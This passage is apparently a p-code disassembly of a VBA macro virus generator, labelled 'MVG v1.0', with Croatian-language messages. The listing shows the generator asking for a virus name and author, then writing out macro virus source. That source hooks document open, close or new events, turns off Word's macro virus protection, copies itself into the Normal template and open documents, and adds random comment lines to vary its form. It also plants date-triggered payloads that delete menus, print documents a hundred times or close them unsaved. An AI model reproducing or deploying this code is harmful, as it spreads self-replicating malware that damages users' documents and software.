' 	MemSt Execute 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld brisvemen 
' 	MemSt Execute 
' Line #52:
' 	LitDI2 0x0001 
' 	Ld sati 
' 	MemSt Execute 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld mjesec 
' 	MemSt Execute 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld OptionButton1 
' 	MemSt Execute 
' Line #53:
' 	LitDI2 0x0001 
' 	Ld odmahclose 
' 	MemSt Execute 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld selec 
' 	MemSt Execute 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld closeme_now 
' 	MemSt Execute 
' Line #54:
' 	LitVarSpecial (True)
' 	Ld p 
' 	MemSt Execute 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	EndSub 
' Line #57:
' Line #58:
' 	FuncDefn (Private Sub CommandButton2_Click())
' Line #59:
' 	Ld Label1_Click 
' 	ArgsMemCall Show 0x0000 
' Line #60:
' 	EndSub 
' Line #61:
' Line #62:
' 	FuncDefn (Private Sub payforma())
' Line #63:
' 	Ld _B_var_payforma 
' 	ArgsMemCall Show 0x0000 
' Line #64:
' 	EndSub 
' Line #65:
' Line #66:
' 	FuncDefn (Private Sub dani_Change())
' Line #67:
' 	Ld dani 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #68:
' 	LitDI2 0x0001 
' 	Ld min 
' 	MemSt Execute 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld insertbris 
' 	MemSt Execute 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld brisvemen 
' 	MemSt Execute 
' Line #69:
' 	LitDI2 0x0001 
' 	Ld sati 
' 	MemSt Execute 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld mjesec 
' 	MemSt Execute 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld OptionButton1 
' 	MemSt Execute 
' Line #70:
' 	LitDI2 0x0001 
' 	Ld odmahclose 
' 	MemSt Execute 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld selec 
' 	MemSt Execute 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld closeme_now 
' 	MemSt Execute 
' Line #71:
' 	LitVarSpecial (True)
' 	Ld p 
' 	MemSt Execute 
' Line #72:
' 	EndIfBlock 
' Line #73:
' Line #74:
' 	EndSub 
' Line #75:
' Line #76:
' 	FuncDefn (Private Sub min_Change())
' Line #77:
' 	Ld min 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #78:
' 	LitDI2 0x0001 
' 	Ld min 
' 	MemSt Execute 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld insertbris 
' 	MemSt Execute 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld brisvemen 
' 	MemSt Execute 
' Line #79:
' 	LitDI2 0x0001 
' 	Ld sati 
' 	MemSt Execute 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld mjesec 
' 	MemSt Execute 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld OptionButton1 
' 	MemSt Execute 
' Line #80:
' 	LitDI2 0x0001 
' 	Ld odmahclose 
' 	MemSt Execute 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld selec 
' 	MemSt Execute 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld closeme_now 
' 	MemSt Execute 
' Line #81:
' 	LitVarSpecial (True)
' 	Ld p 
' 	MemSt Execute 
' Line #82:
' 	EndIfBlock 
' Line #83:
' 	EndSub 
' Line #84:
' Line #85:
' 	FuncDefn (Private Sub enmd())
' Line #86:
' 	Ld odmahclose 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #87:
' 	StartWithExpr 
' 	Ld selec 
' 	With 
' Line #88:
' 	LitVarSpecial (True)
' 	MemStWith Execute 
' Line #89:
' 	LitVarSpecial (False)
' 	MemStWith Frame4_Click 
' Line #90:
' 	EndWith 
' Line #91:
' 	ElseBlock 
' Line #92:
' 	StartWithExpr 
' 	Ld selec 
' 	With 
' Line #93:
' 	LitVarSpecial (False)
' 	MemStWith Execute 
' Line #94:
' 	EndWith 
' Line #95:
' 	EndIfBlock 
' Line #96:
' 	EndSub 
' Line #97:
' Line #98:
' 	FuncDefn (Public Sub _B_var_a())
' Line #99:
' 	QuoteRem 0x0000 0x0038 "===[ varijable za time payload ]========================"
' Line #100:
' 	Ld min 
' 	MemLd Text 
' 	St start_opcija 
' 	BoS 0x0000 
' 	Ld sati 
' 	MemLd Text 
' 	St B 
' 	BoS 0x0000 
' 	Ld dani 
' 	MemLd Text 
' 	St d 
' 	BoS 0x0000 
' 	Ld mjesec 
' 	MemLd Text 
' 	St e 
' Line #101:
' 	QuoteRem 0x0000 0x0038 "===[ varijable za HOOK infekciju ]======================"
' Line #102:
' 	Ld op1 
' 	MemLd _B_var_Text 
' 	St h 
' 	BoS 0x0000 
' 	Ld op2 
' 	MemLd _B_var_Text 
' 	St i 
' 	BoS 0x0000 
' 	Ld op3 
' 	MemLd _B_var_Text 
' 	St k 
' Line #103:
' 	QuoteRem 0x0000 0x0038 "===[ varijable za MENU opcije ]========================="
' Line #104:
' 	Ld insertbris 
' 	MemLd _B_var_Text 
' 	St Sections 
' 	BoS 0x0000 
' 	Ld brisvemen 
' 	MemLd _B_var_Text 
' 	St l 
' Line #105:
' 	Ld OptionButton1 
' 	MemLd _B_var_Text 
' 	St textbox7 
' Line #106:
' 	QuoteRem 0x0000 0x0038 "===[ varijable za Razne Stvarke ]======================="
' Line #107:
' 	Ld odmahclose 
' 	MemLd _B_var_Text 
' 	St n 
' 	BoS 0x0000 
' 	Ld closeme_now 
' 	MemLd _B_var_Text 
' 	St o 
' 	BoS 0x0000 
' 	Ld p 
' 	MemLd _B_var_Text 
' 	St brissvemen 
' Line #108:
' Line #109:
' 	QuoteRem 0x0000 0x0038 "===[ varijabla za selec ]==============================="
' Line #110:
' 	Ld selec 
' 	MemLd Text 
' 	St tulzmen 
' Line #111:
' 	QuoteRem 0x0000 0x0038 "===[ kraj definisanja varijabli ]======================="
' Line #112:
' Line #113:
' 	QuoteRem 0x0000 0x0020 "Pocetak ispisa u txt datoteku..."
' Line #114:
' 	Ld op1 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld op2 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	Ld op3 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #115:
' 	LitStr 0x001E "Mora postojati HOOK infekcije!"
' 	Ld vbCritical 
' 	LitStr 0x0017 "MVG v1.0 - Fatal error!"
' 	ArgsCall MsgBox 0x0003 
' Line #116:
' 	EndIfBlock 
' Line #117:
' 	LitStr 0x0023 "Virus ce biti kreiran na Desktop-u!"
' 	Ld mvginfo_Click 
' 	LitStr 0x000F "MVG v1.0 - Tip!"
' 	ArgsCall MsgBox 0x0003 
' Line #118:
' 	LitStr 0x0014 "Unesite ime virusa: "
' 	LitStr 0x0008 "MVG v1.0"
' 	ArgsLd _B_var_End 0x0002 
' 	St _B_var_vir_ime 
' Line #119:
' 	LitStr 0x000A "Vas nick: "
' 	LitStr 0x0008 "MVG v1.0"
' 	ArgsLd _B_var_End 0x0002 
' 	St _B_var_aut_ime 
' Line #120:
' 	Ld _B_var_vir_ime 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #121:
' 	LitStr 0x0007 "default"
' 	St _B_var_vir_ime 
' Line #122:
' 	LitStr 0x0038 "Posto niste upisali ime virusa, za ime je uzeto default!"
' 	Ld mvginfo_Click 
' 	LitStr 0x000F "MVG v1.0 - Tip!"
' 	ArgsCall MsgBox 0x0003 
' Line #123:
' 	EndIfBlock 
' Line #124:
' 	Ld _B_var_aut_ime 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #125:
' 	LitStr 0x0006 "NoBody"
' 	St _B_var_aut_ime 
' Line #126:
' 	EndIfBlock 
' Line #127:
' 	LitStr 0x0011 "Progres u toku..."
' 	Ld _B_var_False 
' 	MemSt Caption 
' Line #128:
' 	LitDI2 0x0003 
' 	Ld Appearance 
' 	MemSt _B_var_Text 
' Line #129:
' 	LitStr 0x0013 "c:\Windows\desktop\"
' 	Ld _B_var_vir_ime 
' 	Concat 
' 	LitStr 0x0004 ".txt"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #130:
' 	Ld op1 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #131:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	PrintItemNL 
' Line #132:
' 	ElseBlock 
' Line #133:
' 	Ld op2 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #134:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	PrintItemNL 
' Line #135:
' 	ElseBlock 
' Line #136:
' 	Ld op3 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #137:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "Private Sub Document_New()"
' 	PrintItemNL 
' Line #138:
' 	EndIfBlock 
' Line #139:
' 	EndIfBlock 
' Line #140:
' 	EndIfBlock 
' Line #141:
' 	LitDI2 0x0006 
' 	Ld Appearance 
' 	MemSt _B_var_Text 
' Line #142:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002F "Const jedan = 1: nula = 2*0: verzija = (10 - 1)"
' 	PrintItemNL 
' Line #143:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "With Options"
' 	PrintItemNL 
' Line #144:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 ".VirusProtection = nula"
' 	PrintItemNL 
' Line #145:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "End With"
' 	PrintItemNL 
' Line #146:
' 	LitDI2 0x000A 
' 	Ld Appearance 
' 	MemSt _B_var_Text 
' Line #147:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "If Application.Version = verzija & "
' 	LitDI2 0x0022 
' 	ArgsLd Asc 0x0001 
' 	Concat 
' 	LitStr 0x0001 "."
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Asc 0x0001 
' 	Concat 
' 	LitStr 0x000D " & nula Then "
' 	Concat 
' 	PrintItemNL 
' Line #148:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "GoTo pocni"
' 	PrintItemNL 
' Line #149:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "aha:"
' 	PrintItemNL 
' Line #150:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "GoTo startaj"
' 	PrintItemNL 
' Line #151:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "startaj:"
' 	PrintItemNL 
' Line #152:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "GoTo aha"
' 	PrintItemNL 
' Line #153:
' 	LitDI2 0x000D 
' 	Ld Appearance 
' 	MemSt _B_var_Text 
' Line #154:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "pocni:"
' 	PrintItemNL 
' Line #155:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0041 "Set vx = ThisDocument.VBProject: Set ma = vx.VBComponents(jedan):"
' 	PrintItemNL 
' Line #156:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0064 "ve = ma.CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(jedan).CodeModule.CountOfLines)"
' 	PrintItemNL 
' Line #157:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "If nt <> ve Then"
' 	PrintItemNL 
' Line #158:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0043 "Set infnt = NormalTemplate.VBProject.VBComponents(jedan).CodeModule"
' 	PrintItemNL 
' Line #159:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "infnt.DeleteLines 1, infnt.CountOfLines"
' 	PrintItemNL 
' Line #160:
' 	LitDI2 0x0014 
' 	Ld Appearance 
' 	MemSt _B_var_Text 
' Line #161:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "infnt.AddFromString ve"
' 	PrintItemNL 
' Line #162:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "End If"
' 	PrintItemNL 
' Line #163:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0043 "Set we = NormalTemplate.VBProject: Set ku = we.VBComponents(jedan):"
' 	PrintItemNL 
' Line #164:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0062 "nt = ku.CodeModule.Lines(1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)"
' 	PrintItemNL 
' Line #165:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "If ad <> ve Then"
' 	PrintItemNL 
' Line #166:
' 	LitDI2 0x0018 
' 	Ld Appearance 
' 	MemSt _B_var_Text 
' Line #167:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0044 "Set INFAD = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule"
' 	PrintItemNL 
' Line #168:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "INFAD.DeleteLines 1, INFAD.CountOfLines"
' 	PrintItemNL 
' Line #169:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "INFAD.AddFromString ve"
' 	PrintItemNL 
' Line #170:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0043 "Set vo = ActiveDocument.VBProject: Set gr = vo.VBComponents(jedan):"
' 	PrintItemNL 
' Line #171:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0066 "ad = gr.CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents.Item(jedan).CodeModule.CountOfLines)"
' 	PrintItemNL 
' Line #172:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "End If"
' 	PrintItemNL 
' Line #173:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "End If"
' 	PrintItemNL 
' Line #174:
' 	LitDI2 0x001C 
' 	Ld Appearance 
' 	MemSt _B_var_Text 
' Line #175:
' 	Ld sec 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #176:
' 	GoTo Label9 
' Line #177:
' 	ElseBlock 
' 	BoS 0x0000 
' 	GoTo scr 
' Line #178:
' 	EndIfBlock 
' Line #179:
' 	Label Label9 
' Line #180:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0035 "Dim KSJDHFE, PODFGHN, ZXCASDF, PIOUWER, A, B, QWPEOIS"
' 	PrintItemNL 
' Line #181:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0044 "adf = ThisDocument.VBProject.VBComponents(1).CodeModule.CountOfLines"
' 	PrintItemNL 
' Line #182:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "For ah = 1 To adf"
' 	PrintItemNL 
' Line #183:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004E "dg = Mid(ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(ah, 1), 1, 1)"
' 	PrintItemNL 
' Line #184:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "If dg = "
' 	LitDI2 0x0022 
' 	ArgsLd Asc 0x0001 
' 	Concat 
' 	LitStr 0x0001 "'"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Asc 0x0001 
' 	Concat 
' 	LitStr 0x0049 " Then ThisDocument.VBProject.VBComponents(1).CodeModule.DeleteLines ah, 1"
' 	Concat 
' 	PrintItemNL 
' Line #185:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Next ah"
' 	PrintItemNL 
' Line #186:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "For KSJDHFE = 10 To 1 Step -2"
' 	PrintItemNL 
' Line #187:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "For PODFGHN = 0 To 2"
' 	PrintItemNL 
' Line #188:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0035 "ZXCASDF = Chr(Rnd * 105 + 1) & Asc(Chr(Rnd * 10 + 1))"
' 	PrintItemNL 
' Line #189:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "QWPEOIS = Hex(Rnd * 120 + 4)"
' 	PrintItemNL 
' Line #190:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "PIOUWER = ZXCASDF & PIOUWER & QWPEOIS"
' 	PrintItemNL 
' Line #191:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "Next PODFGHN"
' 	PrintItemNL 
' Line #192:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "Next KSJDHFE"
' 	PrintItemNL 
' Line #193:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0041 "Set AdAcTiV = ActiveDocument.VBProject.VBComponents(1).CodeModule"
' 	PrintItemNL 
' Line #194:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002D "For c = 1 To AdAcTiV.CountOfLines + 38 Step 2"
' 	PrintItemNL 
' Line #195:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "AdAcTiV.insertlines c + 1, "
' 	LitDI2 0x0022 
' 	ArgsLd Asc 0x0001 
' 	Concat 
' 	LitStr 0x0001 "'"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Asc 0x0001 
' 	Concat 
' 	LitStr 0x000A " & PIOUWER"
' 	Concat 
' 	PrintItemNL 
' Line #196:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "Next c"
' 	PrintItemNL 
' Line #197:
' 	Label scr 
' Line #198:
' 	LitDI2 0x0022 
' 	Ld Appearance 
' 	MemSt _B_var_Text 
' Line #199:
' 	Ld min 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld sati 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	Ld dani 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	Ld mjesec 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	IfBlock 
' Line #200:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "If Second(Now()) = "
' 	Ld start_opcija 
' 	Concat 
' 	LitStr 0x0005 " And "
' 	Concat 
' 	LitStr 0x0010 "Minute(Now()) = "
' 	Concat 
' 	Ld B 
' 	Concat 
' 	LitStr 0x0005 " And "
' 	Concat 
' 	LitStr 0x000E "Hour(Now()) = "
' 	Concat 
' 	Ld d 
' 	Concat 
' 	LitStr 0x0005 " And "
' 	Concat 
' 	LitStr 0x000D "Day(Now()) = "
' 	Concat 
' 	Ld e 
' 	Concat 
' 	LitStr 0x0005 " then"
' 	Concat 
' 	PrintItemNL 
' Line #201:
' 	Ld Sections 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #202:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "CommandBars("
' 	LitDI2 0x0022 
' 	ArgsLd Asc 0x0001 
' 	Concat 
' 	LitStr 0x0005 "Tools"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Asc 0x0001 
' 	Concat 
' 	LitStr 0x0009 ").Delete""
' 	Concat 
' 	PrintItemNL 
' Line #203:
' 	ElseBlock 
' Line #204:
' 	Ld l 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #205:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "CommandBars("Insert").Delete""
' 	PrintItemNL 
' Line #206:
' 	ElseBlock 
' Line #207:
' 	Ld textbox7 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #208:
' 	EndIfBlock 
' Line #209:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "For ERTIGA = 1 To CommandBars.Count"
' 	PrintItemNL 
' Line #210:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "CommandBars(ERTIGA).Delete"
' 	PrintItemNL 
' Line #211:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "Next ERTIGA"
' 	PrintItemNL 
' Line #212:
' 	Ld odmahclose 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #213:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "Selection.Text = "
' 	Ld selec 
' 	MemLd Text 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Concat 
' 	PrintItemNL 
' Line #214:
' 	ElseBlock 
' Line #215:
' 	Ld closeme_now 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #216:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "For X = 1 To 100"
' 	PrintItemNL 
' Line #217:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "ActiveDocument.PrintOut"
' 	PrintItemNL 
' Line #218:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "Next X"
' 	PrintItemNL 
' Line #219:
' 	ElseBlock 
' Line #220:
' 	Ld p 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #221:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "ActiveDocument.Close SaveChanges:=False"
' 	PrintItemNL 
' Line #222:
' 	EndIfBlock 
' Line #223:
' 	EndIfBlock 
' Line #224:
' 	EndIfBlock 
' Line #225:
' 	EndIfBlock 
' Line #226:
' 	EndIfBlock 
' Line #227:
' 	EndIfBlock 
' Line #228:
' 	LitDI2 0x0027 
' 	Ld Appearance 
' 	MemSt _B_var_Text 
' Line #229:
' 	Ld min 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld sati 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Eq 
' 	And 
' 	Ld dani 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Eq 
' 	And 
' 	Ld mjesec 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Eq 
' 	And 
' 	IfBlock 
' Line #230:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "If Second(Now()) =  "
' 	PrintItemSemi 
' 	Ld start_opcija 
' 	PrintItemSemi 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #231:
' 	Ld Sections 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #232:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "CommandBars("Tools").Delete"
' 	PrintItemNL 
' Line #233:
' 	ElseBlock 
' Line #234:
' 	Ld l 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #235:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "CommandBars("Insert").Delete"
' 	PrintItemNL 
' Line #236:
' 	ElseBlock 
' Line #237:
' 	Ld textbox7 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #238:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "For ERTIGA = 1 To CommandBars.Count"
' 	PrintItemNL 
' Line #239:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "CommandBars(ERTIGA).Delete"
' 	PrintItemNL 
' Line #240:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "Next ERTIGA"
' 	PrintItemNL 
' Line #241:
' 	Ld odmahclose 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #242:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "Selection.Text = "
' 	Ld selec 
' 	MemLd Text 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Concat 
' 	PrintItemNL 
' Line #243:
' 	ElseBlock 
' Line #244:
' 	Ld closeme_now 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #245:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "For X = 1 To 100"
' 	PrintItemNL 
' Line #246:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "ActiveDocument.PrintOut"
' 	PrintItemNL 
' Line #247:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "Next X"
' 	PrintItemNL 
' Line #248:
' 	ElseBlock 
' Line #249:
' 	Ld p 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #250:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "ActiveDocument.Close SaveChanges:=False"
' 	PrintItemNL 
' Line #251:
' 	EndIfBlock 
' Line #252:
' 	EndIfBlock 
' Line #253:
' 	EndIfBlock 
' Line #254:
' 	EndIfBlock 
' Line #255:
' 	EndIfBlock 
' Line #256:
' 	EndIfBlock 
' Line #257:
' 	EndIfBlock 
' Line #258:
' 	LitDI2 0x002C 
' 	Ld Appearance 
' 	MemSt _B_var_Text 
' Line #259:
' 	Ld min 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld sati 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	Ld dani 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Eq 
' 	And 
' 	Ld mjesec 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Eq 
' 	And 
' 	IfBlock 
' Line #260:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "If Second(Now()) = "
' 	Ld start_opcija 
' 	Concat 
' 	LitStr 0x0005 " And "
' 	Concat 
' 	LitStr 0x0010 "Minute(Now()) = "
' 	Concat 
' 	Ld B 
' 	Concat 
' 	LitStr 0x0005 " then"
' 	Concat 
' 	PrintItemNL 
' Line #261:
' 	Ld Sections 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #262:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "CommandBars("Tools").Delete"
' 	PrintItemNL 
' Line #263:
' 	ElseBlock 
' Line #264:
' 	Ld l 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #265:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "CommandBars("Insert").Delete"
' 	PrintItemNL 
' Line #266:
' 	ElseBlock 
' Line #267:
' 	Ld textbox7 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #268:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "For ERTIGA = 1 To CommandBars.Count"
' 	PrintItemNL 
' Line #269:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "CommandBars(ERTIGA).Delete"
' 	PrintItemNL 
' Line #270:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "Next ERTIGA"
' 	PrintItemNL 
' Line #271:
' 	Ld odmahclose 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #272:
